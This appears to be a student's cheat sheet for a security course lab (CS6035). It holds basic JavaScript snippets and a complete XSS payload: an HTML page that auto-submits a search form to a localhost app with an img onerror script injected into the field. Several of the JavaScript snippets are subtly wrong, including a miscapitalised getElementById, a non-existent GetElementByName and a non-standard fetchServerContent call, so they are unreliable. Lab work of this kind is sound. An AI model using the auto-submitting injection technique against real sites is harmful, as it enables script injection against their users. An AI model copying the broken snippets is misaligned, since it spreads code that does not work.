# JavaScript
```JavaScript
# Write to console
console.log(<Variable>);

# Get an element from the page
var <Variable> = document.GetElementById("<ID>");
var <Variable> = document.GetElementByName("<Name>");

# Get content from a page
fetchServerContent("<URL>");

# Events
document.addEventListener('click', (event) => {
  event.preventDefault();
});
```

# XSS Payload
```JavaScript
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Flag 3</title>
</head>
<body>
    // Makes a get request to the URI
    <form id="searchForm" method="GET" action="http://localhost:7149/search">
            // Fills the form with the payload text
            <input type="text" name="search" value="<img src=x onerror='alert(&quot;CS6035&quot;)'>">
    </form>
    <script>
            // Wait for the window to load and set a timeout of 1 second before submitting the form
            window.onload = function() {
                    setTimeout(function() {
                            document.getElementById('searchForm').submit();
                    }, 1000);
            };
    </script>
</body>
</html>
```
